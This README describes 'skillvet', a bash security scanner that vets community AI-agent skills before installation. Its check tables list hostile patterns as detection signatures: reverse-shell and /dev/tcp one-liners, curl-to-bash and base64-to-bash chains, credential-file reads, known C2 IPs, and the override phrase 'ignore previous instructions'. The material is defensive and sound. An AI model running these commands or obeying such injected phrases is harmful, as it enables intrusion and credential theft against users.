---
name: skillvet
description: "Security scanner for ClawHub/community skills — detects malware, credential theft, exfiltration, prompt injection, obfuscation, homograph attacks, ANSI injection, campaign-specific attack patterns, and more before you install. Use when installing skills from ClawHub or any public marketplace, reviewing third-party agent skills for safety, or vetting untrusted code before giving it to your AI agent. Triggers: install skill, audit skill, check skill, vet skill, skill security, safe install, is this skill safe."
compatibility: "Requires bash, grep, find, and file (standard POSIX). safe-install.sh and scan-remote.sh require the clawdhub CLI. perl or ggrep (Homebrew GNU grep) recommended for full Unicode regex support on macOS."
metadata:
  version: "2.0.9"
  author: oakencore
---

# Skillvet

Security scanner for agent skills. 48 critical checks, 8 warning checks. No dependencies — just bash and grep. Includes Tirith-inspired detection patterns, campaign signatures from [Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting), [Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks), [Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/), and [1Password](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface) ClickFix patterns.

## Usage

**Safe install** (installs, audits, auto-removes if critical):

```bash
bash skills/skillvet/scripts/safe-install.sh <skill-slug>
```

**Audit an existing skill:**

```bash
bash skills/skillvet/scripts/skill-audit.sh skills/some-skill
```

**Audit all installed skills:**

```bash
for d in skills/*/; do bash skills/skillvet/scripts/skill-audit.sh "$d"; done
```

**JSON output** (for automation):

```bash
bash skills/skillvet/scripts/skill-audit.sh --json skills/some-skill
```

**SARIF output** (for GitHub Code Scanning / VS Code):

```bash
bash skills/skillvet/scripts/skill-audit.sh --sarif skills/some-skill
```

**Summary mode** (one-line per skill):

```bash
bash skills/skillvet/scripts/skill-audit.sh --summary skills/some-skill
```

**Verbose mode** (debug which checks run and what files are scanned):

```bash
bash skills/skillvet/scripts/skill-audit.sh --verbose skills/some-skill
```

**Scan remote skill without installing:**

```bash
bash skills/skillvet/scripts/scan-remote.sh <skill-slug>
```

**Diff scan** (only scan what changed between versions):

```bash
bash skills/skillvet/scripts/diff-scan.sh path/to/old-version path/to/new-version
```

Exit codes: `0` clean, `1` warnings only, `2` critical findings.

### Advanced Options

| Flag | Description |
|------|-------------|
| `--json` | JSON output for CI/dashboards |
| `--sarif` | SARIF v2.1.0 output for GitHub Code Scanning |
| `--summary` | One-line output per skill |
| `--verbose` | Show which checks run and which files are scanned |
| `--exclude-self` | Skip scan when scanning own source directory |
| `--max-file-size N` | Skip files larger than N bytes |
| `--max-depth N` | Limit directory traversal depth |

### Suppressing False Positives

Create a `.skillvetrc` file in the skill directory to disable specific checks:

```
# Disable check #4 (obfuscation) and #20 (shortened URLs)
disable:4
disable:20
```

Or add inline comments to suppress individual lines:

```js
const url = "https://bit.ly/legit-link"; // skillvet-ignore
```

### Pre-commit Hook

Install the git pre-commit hook to auto-scan skills before committing:

```bash
ln -sf ../../scripts/pre-commit-hook .git/hooks/pre-commit
```

### Risk Scoring

Each finding has a severity weight (1-10). The aggregate risk score is included in JSON, SARIF, and summary output. Higher scores indicate more dangerous patterns:

- **10**: Reverse shells, known C2 IPs
- **9**: Data exfiltration, pipe-to-shell, persistence + network, ClickFix, base64 execution
- **7-8**: Credential theft, obfuscation, path traversal, time bombs
- **4-6**: Punycode, homographs, ANSI injection, shortened URLs
- **2-3**: Subprocess execution, network requests, file writes

## Critical Checks (auto-blocked)

### Core Security Checks (1-24)

| # | Check | Example |
|---|-------|---------|
| 1 | Known exfiltration endpoints | webhook.site, ngrok.io, requestbin |
| 2 | Bulk env variable harvesting | `printenv \|`, `${!*@}` |
| 3 | Foreign credential access | ANTHROPIC_API_KEY, TELEGRAM_BOT_TOKEN in scripts |
| 4 | Code obfuscation | base64 decode, hex escapes, dynamic code generation |
| 5 | Path traversal / sensitive files | `../../`, `~/.ssh`, `~/.clawdbot` |
| 6 | Data exfiltration via curl/wget | `curl --data`, `wget --post` with variables |
| 7 | Reverse/bind shells | `/dev/tcp/`, `nc -e`, `socat` |
| 8 | .env file theft | dotenv loading in scripts (not docs) |
| 9 | Prompt injection in markdown | "ignore previous instructions" in SKILL.md |
| 10 | LLM tool exploitation | Instructions to send/email secrets |
| 11 | Agent config tampering | Write/modify AGENTS.md, SOUL.md, clawdbot.json |
| 12 | Unicode obfuscation | Zero-width chars, RTL override, bidi control chars |
| 13 | Suspicious setup commands | curl piped to bash in SKILL.md |
| 14 | Social engineering | Download external binaries, paste-and-run instructions |
| 15 | Shipped .env files | .env files (not .example) in the skill |
| 16 | Homograph URLs *(Tirith)* | Cyrillic i vs Latin i in hostnames |
| 17 | ANSI escape sequences *(Tirith)* | Terminal escape codes in code/data files |
| 18 | Punycode domains *(Tirith)* | `xn--` prefixed IDN-encoded domains |
| 19 | Double-encoded paths *(Tirith)* | `%25XX` percent-encoding bypass |
| 20 | Shortened URLs *(Tirith)* | bit.ly, t.co, tinyurl.com hiding destinations |
| 21 | Pipe-to-shell | `curl \| bash` (HTTP and HTTPS) |
| 22 | String construction evasion | String.fromCharCode, getattr, dynamic call assembly |
| 23 | Data flow chain analysis | Same file reads secrets, encodes, AND sends network requests |
| 24 | Time bomb detection | `Date.now() > timestamp`, `setTimeout(fn, 86400000)` |
| 25 | Known C2/IOC IP blocklist | 91.92.242.30, 54.91.154.110 (known AMOS C2 servers) |
| 26 | Password-protected archives | "extract using password: openclaw" — AV evasion |
| 27 | Paste service payloads | glot.io, pastebin.com hosting malicious scripts |
| 28 | GitHub releases binary downloads | Fake prerequisites pointing to `.zip`/`.exe` on GitHub |
| 29 | Base64 pipe-to-interpreter | `echo '...' \| base64 -D \| bash` — primary macOS vector |
| 30 | Subprocess + network commands | hidden pipe-to-shell in Python/JS code |
| 31 | Fake URL misdirection *(warning)* | decoy URL before real payload |
| 32 | Process persistence + network | `nohup curl ... &` — backdoor with network access |
| 33 | Fake prerequisite pattern | "Prerequisites" section with sketchy external downloads |
| 34 | xattr/chmod dropper | macOS Gatekeeper bypass: download, `xattr -c`, `chmod +x`, execute |
| 35 | ClickFix download+execute chain | `curl -o /tmp/x && chmod +x && ./x`, `open -a` with downloads |
| 36 | Suspicious package sources | `pip install git+https://...`, npm from non-official registries |
| 37 | Staged installer pattern | Fake dependency names like `openclaw-core`, `some-lib` |
| 38 | Fake OS update social engineering | "Apple Software Update required for compatibility" |
| 39 | Known malicious ClawHub actors | zaycv, Ddoy233, Sakaen736jih, Hightower6eu references |
| 40 | Bash /dev/tcp reverse shell | `bash -i >/dev/tcp/IP/PORT 0>&1` (AuthTool pattern) |
| 41 | Nohup backdoor | `nohup bash -c '...' >/dev/null` with network commands |
| 42 | Python reverse shell | `socket.connect` + `dup2`, `pty.spawn('/bin/bash')` |
| 43 | Terminal output disguise | Decoy "downloading..." message before malicious payload |
| 44 | Credential file access | Direct reads of `.env`, `.pem`, `.aws/credentials` |
| 45 | TMPDIR payload staging | AMOS pattern: drop malware to `$TMPDIR` then execute |
| 46 | GitHub raw content execution | `curl raw.githubusercontent.com/... \| bash` |
| 47 | Echo-encoded payloads | Long base64 strings echoed and piped to decoders |
| 48 | Typosquat skill names | `clawdhub-helper`, `openclaw-cli`, `skillvet1` |

## Warning Checks (flagged for review)

| # | Check | Example |
|---|-------|---------|
| W1 | Unknown external tool requirements | Non-standard CLI tools in install instructions |
| W2 | Subprocess execution | child_process, execSync, spawn, subprocess |
| W3 | Network requests | axios, fetch, requests imports |
| W4 | Minified/bundled files | First line >500 chars — can't audit |
| W5 | Filesystem write operations | writeFile, open('w'), fs.append |
| W6 | Insecure transport | `curl -k`, `verify=False` — TLS disabled |
| W7 | Docker untrusted registries | Non-standard image sources |

## Scanned File Types

`.md`, `.js`, `.ts`, `.tsx`, `.jsx`, `.py`, `.sh`, `.bash`, `.rs`, `.go`, `.rb`, `.c`, `.cpp`, `.json`, `.yaml`, `.yml`, `.toml`, `.txt`, `.env*`, `Dockerfile*`, `Makefile`, `pom.xml`, `.gradle`.

Binary files are automatically skipped. Symlinks are followed.

## Portability

Works on Linux and macOS. Unicode checks (#12, #16, #17) use `grep -P` where available, falling back to `perl` on systems without Perl-compatible regex (e.g., stock macOS). If neither is available, those checks are silently skipped.

## IOC Updates

The C2 IP blocklist in check #25 is based on known indicators from:
- [Koi Security report](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) (Feb 2026)
- [The Hacker News coverage](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [OpenSourceMalware analysis](https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto)

To update IOCs, edit the `KNOWN_IPS` entry in `scripts/patterns.b64` (base64-encoded regex pattern).

## CI/CD Integration

### GitHub Actions

A `.github/workflows/test.yml` is included — runs the test suite on both Ubuntu and macOS on push/PR.

### GitHub Code Scanning (SARIF)

```yaml
- name: Run skillvet
  run: bash scripts/skill-audit.sh --sarif skills/some-skill > results.sarif || true

- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

## Limitations

Static analysis only. English-centric prompt injection patterns. Minified JS is flagged but not deobfuscated. A clean scan raises the bar but doesn't guarantee safety.

The scanner flags itself when audited — its own patterns contain the strings it detects. Use `--exclude-self` to skip self-scanning in CI.
